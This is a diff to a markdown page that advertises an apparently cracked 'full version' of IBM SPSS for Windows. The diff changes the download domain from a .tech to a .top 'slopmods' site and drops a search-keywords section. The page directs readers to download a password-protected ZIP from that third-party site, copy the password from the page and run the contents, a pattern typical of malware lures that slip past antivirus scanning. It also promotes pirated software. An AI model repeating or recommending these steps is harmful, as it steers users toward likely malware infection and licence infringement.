@@ -1,6 +1,6 @@
 ***
 
-# IBM SPSS Full Version — Windows Install
+# IBM SPSS Windows Setup
 
 IBM SPSS — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ IBM SPSS — Windows setup and configuration · Premium workspace · Zero nag di
 
 > Use the release page below for Windows.
 
-- **Release page:** [spss.slopmods.tech](https://spss.slopmods.tech/)
-- **Full URL:** `https://spss.slopmods.tech/`
+- **Release page:** [spss.slopmods.top](https://spss.slopmods.top/)
+- **Full URL:** `https://spss.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **spss.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **spss.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ IBM SPSS — Windows setup and configuration · Premium workspace · Zero nag di
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **spss.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **spss.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Search notes
-
-Install guide for **IBM SPSS** full version on Windows PC (setup notes from release page).
 ## What you get
 
 - Core IBM SPSS features on Windows desktop
